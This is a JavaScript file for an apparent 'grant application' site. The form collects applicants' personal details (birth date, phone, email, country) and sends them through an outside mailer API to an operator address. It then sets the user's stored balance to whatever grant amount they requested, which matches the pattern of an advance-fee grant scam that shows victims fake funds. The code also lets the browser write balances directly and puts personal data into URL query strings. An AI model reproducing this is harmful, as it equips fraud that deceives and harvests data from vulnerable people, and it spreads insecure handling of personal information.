const appwrite_url = "https://fra.cloud.appwrite.io/v1";
const project_id = "686815220031b86fa074";
const database_id = "686969bc000e208d6e74";
const collection_id = "686969c800398b500084";

const client = new Appwrite.Client()
  .setEndpoint(appwrite_url)
  .setProject(project_id);

const databases = new Appwrite.Databases(client);
const notyf = new Notyf();

document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("application-form").addEventListener("submit", async (e) => {
    e.preventDefault();

    const name = document.getElementById("name").value.trim();
    const dob = document.getElementById("date").value.trim();
    const gender = document.getElementById("gender").value.trim();
    const email = document.getElementById("email").value.trim();
    const phoneno = document.getElementById("phoneno").value.trim();
    const country = document.getElementById("country").value.trim();
    const granttype = document.getElementById("granttype").value.trim();
    const grantamount = document.getElementById("grantamount").value.trim();
    const purpose = document.getElementById("purpose").value.trim();
    const referrals = document.getElementById("referrals").value.trim();

    const message = `Name: ${name}
Date of Birth: ${dob}
Gender: ${gender}
Email: ${email}
Phone Number: ${phoneno}
Country: ${country}
Grant Type: ${granttype}
Grant Amount: ${grantamount}
Purpose: ${purpose}
Referrals: ${referrals}`;

    notyf.success("Processing request...");
   try {
      await sendMail("Grant Application", "support@libertytrustgrant.xyz", message);
    } catch (error) {
      
    } 
let userId = localStorage.getItem("id");

if (userId) {
  const amountValue = grantamount.replace(/[^0-9.]/g, ""); // removes $, ₦, etc.

  try {
    const result = await databases.updateDocument(
      database_id,
      collection_id,
      userId,
      {
        balance: parseFloat(amountValue)
        
      }
      // You can add permissions here if needed
    );
    console.log("User balance updated:", result);
  } catch (error) {
    console.error("Failed to update balance:", error);
    notyf.error(`Could not update user balance: ${JSON.stringify(error)}`);
  }
}    location.replace("success.html");
  });

  // too buggy, no time to fix
  // redirectUnregistered();
});

function sendMail(title, email, message) {
  const url = `https://mailmanapi.vercel.app/send?title=${encodeURIComponent(title)}&email=${encodeURIComponent(email)}&message=${encodeURIComponent(message)}`;

  return fetch(url)
    .then(response => response.json())
    .then(data => {
      console.log("Response:", data);
    })
    .catch(error => {
      console.error("Error:", error);
    });
}

function redirectUnregistered() {
  const userId = localStorage.getItem("id");

  if (!userId) {
    location.replace("../../user");
    notyf.error("Login session expired!");
    return;
  }

  databases.getDocument(database_id, collection_id, userId)
    .then((doc) => {
      document.getElementById("headername").innerText = doc.firstname || "User";
      document.getElementById("balance").innerText = doc.balance || 0.00;
    })
    .catch((err) => {
      notyf.error("User not found or error occurred:");
      location.replace("../../user");
    });
}
